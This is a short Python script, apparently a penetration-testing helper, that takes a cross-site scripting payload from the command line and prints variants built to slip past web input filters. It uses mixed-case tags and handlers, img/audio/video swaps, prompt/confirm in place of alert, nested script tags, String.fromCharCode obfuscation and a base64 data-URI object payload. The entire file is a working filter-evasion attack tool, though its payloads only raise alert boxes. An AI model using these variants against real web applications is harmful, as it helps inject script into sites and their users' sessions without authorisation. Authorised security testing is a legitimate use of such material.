#!/usr/bin/python3 

import sys

s = str(sys.argv[1])
payloads=[]

## add user provided string to payloads and make any appropriate modifications to payload to bypass filters ##
payloads.append(s)
payloads.append(s.replace("script", "ScRiPt"))
payloads.append(s.replace("src", "srC"))
payloads.append(s.replace("img", "iMg"))
payloads.append(s.replace("audio", "AuDiO"))
payloads.append(s.replace("video", "vIdEo"))
payloads.append(s.replace("onerror", "OnErrOr"))
payloads.append(s.replace("img", "audio"))
payloads.append(s.replace("img", "AuDiO"))
payloads.append(s.replace("img", "video"))
payloads.append(s.replace("img", "ViDeO"))
payloads.append(s.replace("onerror", "onload"))
payloads.append(s.replace("alert", "prompt"))
payloads.append(s.replace("alert", "confirm"))
payloads.append(s.replace("audio", "img"))
payloads.append(s.replace("audio", "ImG"))
payloads.append(s.replace("audio", "ViDeO"))
payloads.append(s.replace("video", "ImG"))
payloads.append(s.replace("video", "aUdIo"))
payloads.append(s.replace("script", "scr<script>ipt"))
payloads.append(s.replace("alert(1)", "alert(\"NGS XSS\")"))
payloads.append(s.replace("alert(1)", "eval(String.fromCharCode(97,108,101,114,116,40,34,78,71,83,32,88,83,34,41))"))
payloads.append(s.replace("<script>alert(1)</script>", "<html ontouchstart=alert(1)"))
payloads.append(s.replace("<script>alert(1)</script>", "<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>"))



## sort by unique ##
unique = sorted(set(payloads))
## Add generic testing payloads ##
#unique.append("<h1>test</h1>")
#unique.append("\"><h1>test</h1>")
#unique.append("<b>test</b>")
#unique.append("\"><b>test</b>")
print("\n".join(unique))

